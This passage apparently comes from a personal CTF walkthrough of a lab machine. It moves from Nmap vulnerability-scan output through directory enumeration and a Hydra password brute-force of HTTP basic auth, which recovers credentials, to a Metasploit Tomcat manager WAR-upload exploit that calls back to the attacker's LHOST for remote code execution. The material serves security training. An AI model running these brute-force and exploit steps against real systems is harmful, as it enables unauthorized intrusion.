\tMSF:ILITIES/UBUNTU-CVE-2018-1303/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1303/\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2017-15710/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED\t5.0\thttps://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED\t*EXPLOIT*\n|     \tEXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D\t5.0\thttps://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D\t*EXPLOIT*\n|     \tEXPLOITPACK:2666FB0676B4B582D689921651A30355\t5.0\thttps://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355\t*EXPLOIT*\n|     \tEDB-ID:42745\t5.0\thttps://vulners.com/exploitdb/EDB-ID:42745\t*EXPLOIT*\n|     \tEDB-ID:40909\t5.0\thttps://vulners.com/exploitdb/EDB-ID:40909\t*EXPLOIT*\n|     \tCVE-2021-34798\t5.0\thttps://vulners.com/cve/CVE-2021-34798\n|     \tCVE-2021-33193\t5.0\thttps://vulners.com/cve/CVE-2021-33193\n|     \tCVE-2021-26690\t5.0\thttps://vulners.com/cve/CVE-2021-26690\n|     \tCVE-2020-1934\t5.0\thttps://vulners.com/cve/CVE-2020-1934\n|     \tCVE-2019-17567\t5.0\thttps://vulners.com/cve/CVE-2019-17567\n|     \tCVE-2019-0220\t5.0\thttps://vulners.com/cve/CVE-2019-0220\n|     \tCVE-2019-0196\t5.0\thttps://vulners.com/cve/CVE-2019-0196\n|     \tCVE-2018-17199\t5.0\thttps://vulners.com/cve/CVE-2018-17199\n|     \tCVE-2018-17189\t5.0\thttps://vulners.com/cve/CVE-2018-17189\n|     \tCVE-2018-1333\t5.0\thttps://vulners.com/cve/CVE-2018-1333\n|     \tCVE-2018-1303\t5.0\thttps://vulners.com/cve/CVE-2018-1303\n|     \tCVE-2017-9798\t5.0\thttps://vulners.com/cve/CVE-2017-9798\n|     \tCVE-2017-15710\t5.0\thttps://vulners.com/cve/CVE-2017-15710\n|     \tCVE-2016-8743\t5.0\thttps://vulners.com/cve/CVE-2016-8743\n|     \tCVE-2016-8740\t5.0\thttps://vulners.com/cve/CVE-2016-8740\n|     \tCVE-2016-4979\t5.0\thttps://vulners.com/cve/CVE-2016-4979\n|     \t1337DAY-ID-28573\t5.0\thttps://vulners.com/zdt/1337DAY-ID-28573\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/\t4.9\thttps://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/\t*EXPLOIT*\n|     \tCVE-2019-0197\t4.9\thttps://vulners.com/cve/CVE-2019-0197\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1302/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1302/\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1301/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1301/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/\t*EXPLOIT*\n|     \tMSF:ILITIES/DEBIAN-CVE-2019-10092/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10092/\t*EXPLOIT*\n|     \tMSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/\t*EXPLOIT*\n|     \tMSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/\t*EXPLOIT*\n|     \tCVE-2020-11985\t4.3\thttps://vulners.com/cve/CVE-2020-11985\n|     \tCVE-2019-10092\t4.3\thttps://vulners.com/cve/CVE-2019-10092\n|     \tCVE-2018-1302\t4.3\thttps://vulners.com/cve/CVE-2018-1302\n|     \tCVE-2018-1301\t4.3\thttps://vulners.com/cve/CVE-2018-1301\n|     \tCVE-2018-11763\t4.3\thttps://vulners.com/cve/CVE-2018-11763\n|     \tCVE-2016-4975\t4.3\thttps://vulners.com/cve/CVE-2016-4975\n|     \tCVE-2016-1546\t4.3\thttps://vulners.com/cve/CVE-2016-1546\n|     \t4013EC74-B3C1-5D95-938A-54197A58586D\t4.3\thttps://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D\t*EXPLOIT*\n|     \t1337DAY-ID-33575\t4.3\thttps://vulners.com/zdt/1337DAY-ID-33575\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1283/\t3.5\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/\t3.5\thttps://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/\t3.5\thttps://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/\t3.5\thttps://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/\t3.5\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/\t3.5\thttps://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/\t*EXPLOIT*\n|     \tCVE-2018-1283\t3.5\thttps://vulners.com/cve/CVE-2018-1283\n|     \tCVE-2016-8612\t3.3\thttps://vulners.com/cve/CVE-2016-8612\n|     \tPACKETSTORM:152441\t0.0\thttps://vulners.com/packetstorm/PACKETSTORM:152441\t*EXPLOIT*\n|_    \tMSF:EXPLOIT/UNIX/WEBAPP/JOOMLA_MEDIA_UPLOAD_EXEC/\t0.0\thttps://vulners.com/metasploit/MSF:EXPLOIT/UNIX/WEBAPP/JOOMLA_MEDIA_UPLOAD_EXEC/\t*EXPLOIT*\n|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.\n1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1\n|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.\n| http-enum: \n|   /examples/: Sample scripts\n|   /manager/html/upload: Apache Tomcat (401 Unauthorized)\n|   /manager/html: Apache Tomcat (401 Unauthorized)\n|_  /docs/: Potentially interesting folder\n|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.\n|_http-server-header: Apache-Coyote/1.1\n|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.\n8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.92%E=4%D=1/30%OT=22%CT=1%CU=32123%PV=Y%DS=4%DC=T%G=Y%TM=61F71BC\nOS:5%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10F%TI=Z%TS=8)SEQ(SP=104%GC\nOS:D=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M50\nOS:6NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=68DF%W2=68DF%\nOS:W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW7%CC\nOS:=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T\nOS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=\nOS:0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=\nOS:Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=\nOS:G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nUptime guess: 0.019 days (since Sun Jan 30 15:47:12 2022)\nNetwork Distance: 4 hops\nTCP Sequence Prediction: Difficulty=261 (Good luck!)\nIP ID Sequence Generation: All zeros\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 443/tcp)\nHOP RTT       ADDRESS\n1   29.74 ms  10.13.0.1\n2   ... 3\n4   171.05 ms 10.10.28.154\n\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Sun Jan 30 16:14:13 2022 -- 1 IP address (1 host up) scanned in 1300.33 seconds\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;So, we’ve got the following ports:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;22: OpenSSH (&lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Nmap&quot;&gt;Nmap&lt;/a&gt; says it’s 7.2p2, but connecting to it directly reveals it to be 8.7p1)&lt;/li&gt;\n&lt;li&gt;80: Apache httpd 2.4.18&lt;/li&gt;\n&lt;li&gt;1234: Apache Tomcat + Coyote 1.1&lt;/li&gt;\n&lt;li&gt;8009: Apache Jserv 1.3&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;There’s a hidden /protected/ directory on port 80 that seems to be password-protected.&lt;/p&gt;\n&lt;p&gt;No obvious exploits here.&lt;/p&gt;\n&lt;p&gt;We’ll also run a scan with dirbuster (normally I use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/gobuster&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/gobuster&quot;&gt;gobuster&lt;/a&gt;, but I’m trying to operate in the spirit of this CTF):&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;dirbuster&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-l&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; http://10.10.28.154&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This finds the following directories:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;/icons/&lt;/li&gt;\n&lt;li&gt;/icons/small/&lt;/li&gt;\n&lt;li&gt;/guidelines/&lt;/li&gt;\n&lt;li&gt;/protected/&lt;/li&gt;\n&lt;li&gt;/server-status/&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Going to &lt;code&gt;http://10.10.28.154/guidelines/&lt;/code&gt; reveals a single message:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;html&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;html&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Hey &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;b&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;bob&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;b&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, did you update that TomCat server?&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;So, that kinda does imply that Tomcat or Coyote might be vulnerable, even though I couldn’t find anything obvious on &lt;a href=&quot;https://www.exploit-db.com&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Exploit DB&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;. I’ll come back to that.&lt;/p&gt;\n&lt;p&gt;We’ll deploy &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Hydra&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Hydra&quot;&gt;Hydra&lt;/a&gt; against the http-basic authentication protecting /protected/. I’ve never done this before, but a quick internet search reveals &lt;a href=&quot;http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;a potentially useful guide&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, as well as &lt;a href=&quot;https://www.hackingarticles.in/multiple-ways-to-exploiting-http-authentication/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;an additional walk-through&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; clarifying how to use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Hydra&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Hydra&quot;&gt;Hydra&lt;/a&gt; to crack Apache conf-based http-basic authentication. With this information in hand, we should (hopefully) be able to crack Bob’s password using the following:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;hydra&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -l&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; bob&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;      -P&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; ~/.local/share/red-team/wordlists/rockyou.txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;      -f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -vV&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; http-get://10.10.28.154/protected/&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;I’m kinda curious what’s in /protected/. Unfortunately, the experience is kinda anti-climatic.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;html&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;html&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic&quot;&gt;center&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&amp;#x3C;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B31D28;--shiki-dark:#FDAEB7&quot;&gt;br&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; &amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;img&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; width&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;150&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; src&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;protected.png&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; &amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;This protected page has now moved to a different port.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; &amp;#x3C;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic&quot;&gt;center&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Oh well.&lt;/p&gt;\n&lt;p&gt;The CTF does direct us to look at &lt;code&gt;http://10.10.28.154:1234/manager/html&lt;/code&gt; (using Bob’s password); that’s just the Tomcat documentation by the looks of it. But if we throw &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Nikto&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Nikto&quot;&gt;Nikto&lt;/a&gt; against it, we can get ourselves another flag.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;nikto&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -Format&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;      -host&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; http://10.10.28.154:1234/manager/html&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;      -id&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; bob:bubbles&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -nossl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -output&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; tools-r-us.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;At this point we’ve got all but two flags. The text for these imply that we can get RCE on this version of Tomcat. It looks like Apache Tomcat 7.0.88 was released on May 16, 2018. &lt;a href=&quot;https://tomcat.apache.org/security-7.html&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;There’s no obvious &lt;em&gt;vulnerability&lt;/em&gt; to exploit for this version&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, but after searching around a bit on the net I found &lt;a href=&quot;https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;a guide mentioning that RCE on Tomcat could be obtained via the “manager” application&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;. And, indeed, looking at the info for the corresponding module in Metasploit (&lt;code&gt;exploit/multi/http/tomcat_mgr_upload&lt;/code&gt;) reveals that we can obtain RCE if we have access to the /manager/html/upload component. Which we &lt;em&gt;do&lt;/em&gt;, because /manager/html has the option to “Select WAR file to upload”.&lt;/p&gt;\n&lt;p&gt;Now, &lt;code&gt;exploit/multi/http/tomcat_mgr_upload&lt;/code&gt; only targets 32-bit Linux, and the server is running a 64-bit build (this can also be found in /manager/html/), so we’ll use the “Java Universal” target.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;msfconsole&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;msfconsole&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;use exploit/multi/http/tomcat_mgr_upload&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;set HttpPassword bubbles&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;set HttpUsername bob&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;set RHOSTS 10.10.28.154&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;set RPORT 1234&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;set LHOST 10.13.26.40&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;exploit&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;And we have a 